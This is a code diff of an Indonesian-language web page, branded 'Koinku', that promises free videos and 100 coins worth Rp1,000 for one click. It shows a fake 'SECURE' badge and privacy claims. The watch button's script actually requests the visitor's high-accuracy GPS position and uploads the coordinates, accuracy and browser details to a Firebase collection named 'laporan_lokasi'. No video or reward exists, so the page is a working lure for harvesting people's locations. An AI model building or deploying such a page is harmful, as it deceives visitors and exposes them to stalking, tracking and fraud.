@@ -1,24 +1,168 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nonton gratis, dapat bonus koin setiap selesai menonton</title>
-    <!-- Menghubungkan CSS -->
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#100d08">
+  <title>nonton emas</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>Nonton gratis di sini, klik sekarang sebelum hangus</h1>
-        <p class="deskripsi">
-            Halo, Nonton gratis di sini, bonus koin menanti setiap selesai menonton
-        <p class="peringatan">
-            <strong>Transparansi:</strong> Klik tombol di bawah, dapat 100 koin langsung! 1 koin senilai Rp1.000
-        <button id="btn-lokasi">Dapatkan koin sekarang</button>
-        <p id="status"></p>
-    </div>
+  <div class="ambient ambient-one"></div>
+  <div class="ambient ambient-two"></div>
 
-    <!-- Menghubungkan JavaScript sebagai module -->
-    <script type="module" src="app.js"></script>
+  <main class="container">
+    <header class="topbar">
+      <div class="brand-icon">✦</div>
+      <div class="brand">
+        <span class="brand-name">Koinku</span>
+        <span class="brand-subtitle">Dapatkan koinku</span>
+      </div>
+      <div class="secure-badge">
+        <span class="secure-dot"></span>
+        SECURE
+      </div>
+    </header>
+
+    <section class="card">
+      <div class="coin-scene" aria-hidden="true">
+        <div class="coin coin-back">₿</div>
+        <div class="coin coin-side"></div>
+        <div class="coin coin-main">
+          <div class="coin-inner">
+            <span class="coin-star">✦</span>
+            <span class="coin-symbol">A</span>
+            <span class="coin-star">✦</span>
+          </div>
+        </div>
+        <span class="spark spark-one">✧</span>
+        <span class="spark spark-two">✦</span>
+        <span class="spark spark-three">·</span>
+      </div>
+
+      <div class="eyebrow">
+        <span></span> Dapatkan koinku
+      </div>
+
+      <h1>Nonton gratis di sini<br>
+        <span>klik sekarang sebelum hangus</span>
+      </h1>
+
+      <p class="subtitle">
+       Klik tombol di bawah, dapat 100 koin langsung!
+        1 koin senilai Rp1.000.
+      </p>
+
+      <div class="gold-divider">
+        <span></span><span class="divider-star">✦</span><span></span>
+      </div>
+
+      <div class="info-box">
+        <div class="info-icon">⌖</div>
+        <div>
+          <h2>DAPATKAN KOIN SEKARANG</h2>
+          <p>
+            Klik tombolnya sekarang: nonton cuma 1 menit 37 detik, dapat 100 koin—1 koin Rp1.000. Bonus tiap selesaI
+          </p>
+        </div>
+      </div>
+
+      <button id="btn-share" class="btn" type="button">
+        <span class="btn-icon">⌖</span>
+        <span id="btn-label">NONTON SEKARANG</span>
+        <span class="btn-arrow">↗</span>
+      </button>
+
+      <p id="status" class="status-msg" role="status"
+         aria-live="polite"></p>
+
+      <div class="privacy-note">
+        <span>♢</span>
+         hanya dikirim setelah lokasi Anda memberikanan izin browser.
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="footer-line"></div>
+      <p> KOINKU <span>•</span> 100</p>
+      <small>SECURE ACCESS · PRIVACY FIRST</small>
+    </footer>
+  </main>
+
+  <script type="module">
+    import {
+      db, collection, addDoc, serverTimestamp
+    } from './firebase.js';
+
+    const button = document.getElementById('btn-share');
+    const label = document.getElementById('btn-label');
+    const status = document.getElementById('status');
+
+    button.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        status.className = 'status-msg error';
+        status.textContent =
+          'Browser ini tidak mendukung fitur lokasi.';
+        return;
+      }
+
+      button.disabled = true;
+      label.textContent = 'Meminta izin lokasi...';
+      status.className = 'status-msg';
+      status.textContent =
+        'Silakan pilih izinkan pada permintaan lokasi browser.';
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          status.textContent = 'Mengirim lokasi yang Anda setujui...';
+
+          try {
+            await addDoc(collection(db, 'laporan_lokasi'), {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              browser: navigator.userAgent,
+              waktu: serverTimestamp()
+            });
+
+            status.className = 'status-msg success';
+            status.textContent =
+              'Lokasi berhasil dibagikan.';
+            label.textContent = 'Lokasi Terkirim';
+            button.classList.add('success-button');
+          } catch (error) {
+            status.className = 'status-msg error';
+            status.textContent =
+              'Lokasi tidak dapat dikirim. Silakan coba lagi.';
+            button.disabled = false;
+            label.textContent = 'Coba Lagi';
+          }
+        },
+        (error) => {
+          status.className = 'status-msg error';
+
+          if (error.code === error.PERMISSION_DENIED) {
+            status.textContent =
+              'Izin lokasi ditolak. Tidak ada koordinat yang dikirim.';
+          } else if (error.code === error.TIMEOUT) {
+            status.textContent =
+              'Permintaan lokasi melewati batas waktu. Silakan coba lagi.';
+          } else {
+            status.textContent =
+              'Lokasi tidak tersedia. Periksa pengaturan perangkat.';
+          }
+
+          button.disabled = false;
+          label.textContent = 'Coba Lagi';
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    });
+  </script>
 </body>
 </html>
